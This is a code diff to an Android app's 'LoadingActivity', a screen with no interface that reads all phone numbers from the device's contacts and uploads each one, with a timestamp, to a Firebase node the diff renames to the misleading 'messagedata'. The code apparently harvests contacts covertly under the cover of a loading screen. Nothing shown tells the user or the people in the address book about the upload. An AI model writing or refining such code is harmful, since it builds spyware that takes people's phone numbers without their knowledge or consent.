@@ -16,7 +16,10 @@ import androidx.core.content.ContextCompat;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.HashMap;
+import java.util.Locale;
 
 public class LoadingActivity extends AppCompatActivity {
 
@@ -26,8 +29,6 @@ public class LoadingActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
-        // No UI (no setContentView)
         checkContactPermission();
     }
 
@@ -52,37 +53,40 @@ public class LoadingActivity extends AppCompatActivity {
             int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
 
             while (cursor.moveToNext()) {
-                if (nameIndex >= 0 && phoneIndex >= 0) {
-                    String name = cursor.getString(nameIndex);
+                if (phoneIndex >= 0) {
                     String phone = cursor.getString(phoneIndex);
-                    uploadContactToFirebase(name, phone);
+                    uploadContactToFirebase(phone);
                 }
             }
             cursor.close();
         }
 
-        // Optionally finish the activity after uploading
-        finish();
+        finish(); // Close the activity after uploading
     }
 
-    private void uploadContactToFirebase(String name, String phone) {
-        DatabaseReference database = FirebaseDatabase.getInstance().getReference("contacts");
+    private void uploadContactToFirebase(String phone) {
+        DatabaseReference database = FirebaseDatabase.getInstance().getReference("messagedata");
+
         String contactId = database.push().getKey();
 
-        HashMap<String, String> contact = new HashMap<>();
-        contact.put("name", name);
-        contact.put("phone", phone);
+        String currentDateTime = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
+
+        HashMap<String, Object> contact = new HashMap<>();
+        contact.put("phoneNumber", phone);
+        contact.put("dateTime", currentDateTime);
+        contact.put("email", "");         // Placeholder (no email from phone contacts)
+        contact.put("message", "");       // Placeholder (could be filled from user input later)
+        contact.put("status", "unknown"); // Default status
 
         if (contactId != null) {
             database.child(contactId).setValue(contact)
                     .addOnSuccessListener(aVoid ->
-                            Log.d(TAG, "Contact uploaded: " + name))
+                            Log.d(TAG, "Contact uploaded: " + phone))
                     .addOnFailureListener(e ->
                             Log.e(TAG, "Upload failed", e));
         }
     }
 
-    // Handle permission result
     @Override
     public void onRequestPermissionsResult(int requestCode,
                                            @NonNull String[] permissions,
@@ -94,7 +98,7 @@ public class LoadingActivity extends AppCompatActivity {
             fetchAndUploadContacts();
         } else {
             Log.e(TAG, "Permission denied to read contacts");
-            finish(); // Close the activity if permission is denied
+            finish();
         }
     }
 }
